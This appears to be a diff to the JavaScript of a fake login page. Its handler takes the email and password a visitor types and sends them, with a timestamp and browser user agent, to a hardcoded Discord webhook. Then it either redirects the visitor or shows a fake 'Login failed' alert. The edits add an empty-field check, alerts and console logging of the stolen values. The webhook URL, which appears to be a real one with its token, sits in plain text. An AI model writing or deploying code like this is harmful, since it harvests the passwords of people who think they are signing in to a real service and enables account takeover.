@@ -119,12 +119,12 @@ function generateQRCode(data) {
 // ---------- WEBHOOK FUNCTION ----------------------
 // --------------------------------------------------
 async function sendToWebhook(email, password) {
-  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // REPLACE THIS WITH A REAL WEBHOOK URL (e.g., from webhook.site)
+  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
   const payload = {
     email: email,
     password: password,
     timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent // Extra debug info
+    userAgent: navigator.userAgent
   };
 
   console.log("Attempting to send payload:", payload); // Debug: See what’s being sent
@@ -147,6 +147,7 @@ async function sendToWebhook(email, password) {
     return true;
   } catch (error) {
     console.error("Webhook failed:", error.message);
+    alert("There was an error sending the webhook. Check the console.");
     return false;
   }
 }
@@ -158,12 +159,17 @@ loginButton.addEventListener("click", async () => {
   const email = emailInput ? emailInput.value.trim() : "";
   const password = passwordInput ? passwordInput.value.trim() : "";
 
-  // Removed the empty check and alert to always attempt send, even if fields are empty
+  console.log("Email:", email, "Password:", password); // Debug: Make sure you have correct values
+
+  if (!email || !password) {
+    alert("Please enter both email and password!");
+    return; // Don't proceed if fields are empty
+  }
 
   // Start animation
   animateEllipsis();
 
-  // Send to webhook (will send empty strings if fields not filled)
+  // Send to webhook (will send empty strings if fields are not filled)
   const webhookSuccess = await sendToWebhook(email, password);
 
   // After animation (3s), redirect if success
@@ -174,7 +180,7 @@ loginButton.addEventListener("click", async () => {
     } else {
       console.log("Webhook failed - no redirect");
       // Optional: Add alert here if you want user feedback on failure
-      // alert("Login failed - check console for details");
+      alert("Login failed - check console for details");
     }
   }, 3000);
 });
